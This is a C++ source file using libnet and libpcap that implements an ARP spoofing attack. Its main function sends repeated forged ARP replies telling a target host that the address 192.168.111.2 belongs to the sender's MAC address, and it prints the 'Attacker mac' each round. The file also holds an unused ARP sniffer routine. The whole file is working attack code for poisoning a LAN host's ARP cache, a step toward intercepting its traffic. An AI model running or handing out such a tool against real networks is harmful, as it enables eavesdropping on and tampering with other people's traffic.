
#include <pcap.h>
#include <libnet.h>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <iostream>
using std::string;

/* ARP Header, (assuming Ethernet+IPv4)            */
#define ARP_REQUEST 1 /* ARP Request             */
#define ARP_REPLY 2   /* ARP Reply               */

#pragma pack(push)
#pragma pack(1)
typedef struct arphdr
{
    u_int16_t htype; /* Hardware Type           */
    u_int16_t ptype; /* Protocol Type           */
    u_char hlen;     /* Hardware Address Length */
    u_char plen;     /* Protocol Address Length */
    u_int16_t oper;  /* Operation Code          */
    u_char sha[6];   /* Sender hardware address */
    u_char spa[4];   /* Sender IP address       */
    u_char tha[6];   /* Target hardware address */
    u_char tpa[4];   /* Target IP address       */
} arphdr_t;

#pragma pack(pop)

#define MAXBYTES2CAPTURE 2048
libnet_t *l;

u_int8_t act_tha[6] = {0x00, 0x50, 0x56, 0xfa, 0xa7, 0x0d};

bool GetHostInfo(std::string &hostName, std::string &Ip)
{
    char name[256];
    gethostname(name, sizeof(name));
    hostName = name;

    struct hostent *host = gethostbyname(name);
    char ipStr[32];
    const char *ret = inet_ntop(host->h_addrtype, host->h_addr_list[0], ipStr, sizeof(ipStr));
    if (NULL == ret)
    {
        std::cout << "hostname transform to ip failed";
        return false;
    }
    Ip = ipStr;
    return true;
}

int send_arp(char *tIP, std::string serverIp, int times = -1)
{
    in_addr_t spa;                                          /* source ip address */
    in_addr_t tpa;                                          /* destination ip address */
    // u_int8_t tha[6] = {0x00, 0x50, 0x56, 0xc0, 0x00, 0x08}; /* destination mac address */
    // 00:0c:29:21:98:a1
    u_int8_t tha[6] = {0x00, 0x0c, 0x29, 0x21, 0x98, 0xa1}; /* destination mac address */
    struct libnet_ether_addr *sha;                          /* source MAC address */
    libnet_ptag_t arp;                                      /* ARP protocol tag */

    /* get the hardware address for the card we are using */
    sha = libnet_get_hwaddr(l);

    // memset(sha, 5, sizeof(sha));

    // spa = libnet_get_ipaddr4(l);

    // std::string hostName;

    // bool ret = GetHostInfo(hostName, serverIp);
    // if (true == ret)
    // {
    //     std::cout << "hostname: " << hostName << std::endl;
    //     std::cout << "Ip: " << serverIp << std::endl;
    // }

    spa = libnet_name2addr4(l, (char *)serverIp.data(), LIBNET_RESOLVE);

    tpa = libnet_name2addr4(l, tIP, LIBNET_RESOLVE);

    /* build the ARP header */
    arp = libnet_autobuild_arp(ARPOP_REPLY,      /* operation */
                               (u_int8_t *)sha,  /* source hardware addr */
                               (u_int8_t *)&spa, /* source protocol addr */
                               tha,              /* target hardware addr */
                               (u_int8_t *)&tpa, /* target protocol addr */
                               l);               /* libnet context */

    if (arp == -1)
    {
        fprintf(stderr,
                "Unable to build ARP header: %s\n", libnet_geterror(l));
        return -1;
    }

    arp = libnet_autobuild_ethernet(tha, ETHERTYPE_ARP, l);

    if (arp == -1)
    {
        fprintf(stderr, "Can't build ethernet header: %s\n",
                libnet_geterror(l));
        return -1;
    }

    if (times < 0)
    {
        while (true)
        {
            std::cout << "Sending package to " << tIP << std::endl;
            std::cout << "Target mac:";
            for (size_t i = 0; i < 6; i++)
            {
                printf("%02X", tha[i]);
            }
            printf("\n");

            std::cout << "Attacker mac:";
            for (size_t i = 0; i < 6; i++)
            {
                printf("%02X", sha->ether_addr_octet[i]);
            }
            printf("\n");
            libnet_write(l);
            sleep(2);
        }
    }
    else
    {
        for (int i = 0; i < times; i++)
        {
            std::cout << "Sending package to " << tIP << std::endl;
            std::cout << "Target mac:";
            for (size_t i = 0; i < 6; i++)
            {
                printf("%02X", tha[i]);
            }
            printf("\n");

            std::cout << "Attacker mac:";
            for (size_t i = 0; i < 6; i++)
            {
                printf("%02X", sha->ether_addr_octet[i]);
            }
            printf("\n");
            libnet_write(l);
            sleep(2);
        }
    }

    return 0;
}

int recv_arp(int argc, char *argv[])
{
    int i = 0;
    bpf_u_int32 netaddr = 0, mask = 0;  /* To Store network address and netmask   */
    struct bpf_program filter;          /* Place to store the BPF filter program  */
    char errbuf[PCAP_ERRBUF_SIZE];      /* Error buffer                           */
    pcap_t *descr = NULL;               /* Network interface handler              */
    struct pcap_pkthdr pkthdr;          /* Packet information (timestamp,size...) */
    const unsigned char *packet = NULL; /* Received raw data                      */
    arphdr_t *arpheader = NULL;         /* Pointer to the ARP header              */
    memset(errbuf, 0, PCAP_ERRBUF_SIZE);

    if (argc != 2)
    {
        printf("USAGE: arpsniffer <interface>\n");
        exit(1);
    }
    /* Open network device for packet capture */
    if ((descr = pcap_open_live(argv[1], MAXBYTES2CAPTURE, 0, 512, errbuf)) == NULL)
    {
        fprintf(stderr, "ERROR: %s\n", errbuf);
        exit(1);
    }

    /* Look up info from the capture device. */
    if (pcap_lookupnet(argv[1], &netaddr, &mask, errbuf) == -1)
    {
        fprintf(stderr, "ERROR: %s\n", errbuf);
        exit(1);
    }

    /* Compiles the filter expression into a BPF filter program */
    if (pcap_compile(descr, &filter, "arp", 1, mask) == -1)
    {
        fprintf(stderr, "ERROR: %s\n", pcap_geterr(descr));
        exit(1);
    }

    /* Load the filter program into the packet capture device. */
    if (pcap_setfilter(descr, &filter) == -1)
    {
        fprintf(stderr, "ERROR: %s\n", pcap_geterr(descr));
        exit(1);
    }

    while (1)
    {

        if ((packet = pcap_next(descr, &pkthdr)) == NULL)
        { /* Get one packet */
            fprintf(stderr, "ERROR: Error getting the packet: %s\n", errbuf);
            exit(1);
        }

        arpheader = (struct arphdr *)(packet + 14); /* Point to the ARP header */

        printf("\n\nReceived Packet Size: %d bytes\n", pkthdr.len);
        printf("Hardware type: %s\n", (ntohs(arpheader->htype) == 1) ? "Ethernet" : "Unknown");
        printf("Protocol type: %s\n", (ntohs(arpheader->ptype) == 0x0800) ? "IPv4" : "Unknown");
        printf("Operation: %s\n", (ntohs(arpheader->oper) == ARP_REQUEST) ? "ARP Request" : "ARP Reply");

        /* If is Ethernet and IPv4, print packet contents */
        if (ntohs(arpheader->htype) == 1 && ntohs(arpheader->ptype) == 0x0800)
        {
            printf("Sender MAC: ");

            for (i = 0; i < 6; i++)
                printf("%02X:", arpheader->sha[i]);

            printf("\nSender IP: ");

            for (i = 0; i < 4; i++)
                printf("%d.", arpheader->spa[i]);

            printf("\nTarget MAC: ");

            for (i = 0; i < 6; i++)
                printf("%02X:", arpheader->tha[i]);

            printf("\nTarget IP: ");

            for (i = 0; i < 4; i++)
                printf("%d.", arpheader->tpa[i]);

            printf("\n");
        }
    }

    return 0;
}

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        std::cout << "Usage: " << argv[0] << " <Target IP>" << std::endl;
        return -1;
    }

    l = libnet_init(LIBNET_LINK_ADV, "eth0", nullptr);
    send_arp(argv[1], "192.168.111.2", 50);
    libnet_destroy(l);
}
